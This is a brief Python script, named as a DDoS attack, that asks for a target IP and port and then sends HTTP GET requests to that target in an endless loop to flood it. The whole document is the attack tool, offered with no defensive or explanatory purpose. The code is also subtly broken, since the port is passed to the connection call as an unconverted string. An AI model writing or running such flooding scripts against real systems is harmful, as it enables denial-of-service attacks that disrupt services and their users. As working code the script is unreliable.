import socket

target_ip = input("Enter the target IP address: ")
target_port = input("Enter the target port: ")

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
            print(f"Sending request: {request}")
            s.sendall(request.encode())
            s.close()
        except Exception as e:
            print(f"Error: {e}")

ddos_attack()
